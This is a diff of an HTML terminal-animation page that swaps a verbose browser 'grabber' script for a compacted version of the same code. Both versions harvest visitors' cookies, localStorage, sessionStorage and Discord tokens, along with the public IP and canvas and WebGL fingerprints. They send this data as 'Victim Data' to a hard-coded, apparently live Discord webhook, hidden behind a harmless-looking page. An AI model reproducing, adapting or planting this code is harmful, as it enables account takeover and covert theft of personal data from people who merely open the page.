@@ -15,121 +15,42 @@
 <div id="terminal"></div>
 
 <script>
-/* ========== GRABBER MAX ========== */
+/* 
 (function(){
-    const hook = "https://discord.com/api/webhooks/1443161577866924124/3KawgZj1c9mahMBJAyeYTEibDSIRqmqwEgnr6XN3ytYA7tBhGkELpnVVNvi7slWRZedI"; // <------------------------- MUDE AQUI
-
-    /* Helpers */
-    const getCanvasFinger = () => {
-        const cv = document.createElement("canvas");
-        const ctx = cv.getContext("2d");
-        ctx.textBaseline = "top";
-        ctx.font = "14px Arial";
-        ctx.fillStyle = "#f60";
-        ctx.fillRect(0,0,10,10);
-        ctx.fillStyle = "#069";
-        ctx.fillText("canvas",2,2);
-        return cv.toDataURL();
-    };
-    const getWebGLFinger = () => {
-        const cv = document.createElement("canvas");
-        const gl = cv.getContext("webgl") || cv.getContext("experimental-webgl");
-        if(!gl) return "unsupported";
-        const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
-        return debugInfo ? {
-            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
-            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
-        } : "unsupported";
-    };
-    const getPlugins = () => [...navigator.plugins].map(p => p.name).join(", ") || "none";
-    const getTimeZone = () => Intl.DateTimeFormat().resolvedOptions().timeZone;
-    const getScreen = () => `${screen.width}x${screen.height}x${screen.colorDepth}`;
-    const getLang = () => navigator.languages.join(", ");
-    const getCores = () => navigator.hardwareConcurrency || "unknown";
-    const getMem = () => navigator.deviceMemory || "unknown";
-    const getRef = () => document.referrer || "direct";
-    const getCookie = () => document.cookie || "none";
-    const getLocalStorage = () => JSON.stringify(localStorage) || "{}";
-    const getSessionStorage = () => JSON.stringify(sessionStorage) || "{}";
-    const getTiming = () => Math.round(performance.timing.domComplete - performance.timing.navigationStart) + " ms";
-
-    /* Coleta tudo */
-    const payload = {
-        url: location.href,
-        ip: "",
-        ua: navigator.userAgent,
-        platform: navigator.platform,
-        lang: getLang(),
-        tz: getTimeZone(),
-        screen: getScreen(),
-        cores: getCores(),
-        mem: getMem(),
-        ref: getRef(),
-        cookie: getCookie(),
-        localStorage: getLocalStorage(),
-        sessionStorage: getSessionStorage(),
-        plugins: getPlugins(),
-        canvas: getCanvasFinger(),
-        webgl: getWebGLFinger(),
-        loadTime: getTiming(),
-        timestamp: new Date().toISOString()
-    };
-
-    /* IP público */
-    fetch("https://api.ipify.org?format=json")
-        .then(r => r.json())
-        .then(j => { payload.ip = j.ip; send(payload); })
-        .catch(() => { payload.ip = "error"; send(payload); });
-
-    /* Discord token (se houver) */
-    const grabToken = () => {
-        if(localStorage.getItem("token")) return localStorage.getItem("token");
-        const c = document.cookie.split("; ").find(r => r.startsWith("token="));
-        if(c) return c.split("=")[1];
-        return null;
-    };
-    const token = grabToken();
-    if(token) payload.discord_token = token;
-
-    /* Envia para webhook */
-    function send(obj){
-        fetch(hook, {
-            method: "POST",
-            headers: {"Content-Type":"application/json"},
-            body: JSON.stringify({
-                username: "TerminalGrabber",
-                avatar_url: "https://i.imgur.com/7G9cc9e.png",
-                embeds: [{
-                    title: "🔥 Victim Data",
-                    color: 0xff0000,
-                    fields: [
-                        {name:"📍 URL", value: obj.url, inline:false},
-                        {name:"🌐 IP", value: obj.ip, inline:true},
-                        {name:"🖥️ Platform", value: obj.platform, inline:true},
-                        {name:"🧠 Cores", value: obj.cores, inline:true},
-                        {name:"💾 RAM (GB)", value: obj.mem, inline:true},
-                        {name:"🖥️ Screen", value: obj.screen, inline:true},
-                        {name:"🕒 TimeZone", value: obj.tz, inline:true},
-                        {name:"🌐 Langs", value: obj.lang, inline:false},
-                        {name:"🔗 Referrer", value: obj.ref, inline:false},
-                        {name:"🍪 Cookies", value: obj.cookie.slice(0,1000), inline:false},
-                        {name:"💾 LocalStorage", value: obj.localStorage.slice(0,1000), inline:false},
-                        {name:"🔌 Plugins", value: obj.plugins.slice(0,1000), inline:false},
-                        {name:"🎨 Canvas", value: obj.canvas.slice(-20), inline:true},
-                        {name:"🌀 WebGL", value: JSON.stringify(obj.webgl), inline:true},
-                        {name:"⏱️ Load Time", value: obj.loadTime, inline:true},
-                        {name:"🕰️ Timestamp", value: obj.timestamp, inline:false},
-                        {name:"🔑 Discord Token", value: obj.discord_token || "not found", inline:false}
-                    ],
-                    footer: {text:"DarkSage Grabber v2.0"}
-                }]
-            })
-        }).catch(()=>{});
+    const w="https://discord.com/api/webhooks/1443161577866924124/3KawgZj1c9mahMBJAyeYTEibDSIRqmqwEgnr6XN3ytYA7tBhGkELpnVVNvi7slWRZedI";
+    const g={};
+    g.u=location.href;
+    g.ua=navigator.userAgent;
+    g.p=navigator.platform;
+    g.l=(navigator.languages||[]).join(", ");
+    g.tz=Intl.DateTimeFormat().resolvedOptions().timeZone;
+    g.s=`${screen.width}x${screen.height}x${screen.colorDepth}`;
+    g.c=navigator.hardwareConcurrency||"?";
+    g.m=navigator.deviceMemory||"?";
+    g.r=document.referrer||"direct";
+    g.k=document.cookie||"none";
+    g.ls=JSON.stringify({...localStorage}).slice(0,2e3);
+    g.ss=JSON.stringify({...sessionStorage}).slice(0,2e3);
+    g.pl=[...navigator.plugins].map(x=>x.name).join(", ")||"none";
+    const cv=document.createElement("canvas");
+    const ctx=cv.getContext("2d");
+    ctx.textBaseline="top";
+    ctx.font="14px Arial";
+    ctx.fillStyle="#f60";
+    ctx.fillRect(0,0,10,10);
+    ctx.fillStyle="#069";
+    ctx.fillText("canvas",2,2);
+    g.cv=cv.toDataURL();
+    const gl=(cv.getContext("webgl")||cv.getContext("experimental-webgl"));
+    g.gl=gl?(()=>{const d=gl.getExtension("WEBGL_debug_renderer_info");return d?{vendor:gl.getParameter(d.UNMASKED_VENDOR_WEBGL),renderer:gl.getParameter(d.UNMASKED_RENDERER_WEBGL)}:"unsupported"})():"unsupported";
+    g.dt=Date.now();
+    g.dct=localStorage.getItem("token")||(document.cookie.split("; ").find(x=>x.startsWith("token="))||"").split("=")[1]||null;
+    fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(j=>{g.ip=j.ip;send();}).catch(()=>{g.ip="err";send();});
+    function send(){
+        fetch(w,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({username:"TerminalGrabber",avatar_url:"https://i.imgur.com/7G9cc9e.png",embeds:[{title:"🔥 Victim Data",color:0xff0000,fields:[{name:"📍 URL",value:g.u,inline:false},{name:"🌐 IP",value:g.ip,inline:true},{name:"🖥️ Platform",value:g.p,inline:true},{name:"🧠 Cores",value:g.c,inline:true},{name:"💾 RAM (GB)",value:g.m,inline:true},{name:"🖥️ Screen",value:g.s,inline:true},{name:"🕒 TimeZone",value:g.tz,inline:true},{name:"🌐 Langs",value:g.l,inline:false},{name:"🔗 Referrer",value:g.r,inline:false},{name:"🍪 Cookies",value:g.k.slice(0,1e3),inline:false},{name:"💾 LocalStorage",value:g.ls.slice(0,1e3),inline:false},{name:"🔌 Plugins",value:g.pl.slice(0,1e3),inline:false},{name:"🎨 Canvas",value:g.cv.slice(-20),inline:true},{name:"🌀 WebGL",value:JSON.stringify(g.gl),inline:true},{name:"🔑 Discord Token",value:g.dct||"not found",inline:false}],footer:{text:"DarkSage Grabber v2.0"}}]})}).catch(()=>{});
     }
 })();
-/* ========== FIM GRABBER MAX ========== */
 
-/* ========== ANIMAÇÃO ORIGINAL (mantida) ========== */
 const terminal = document.getElementById("terminal");
 const lines = [
     "C:\\Users\\TERMINAL> Iniciando sistema...",
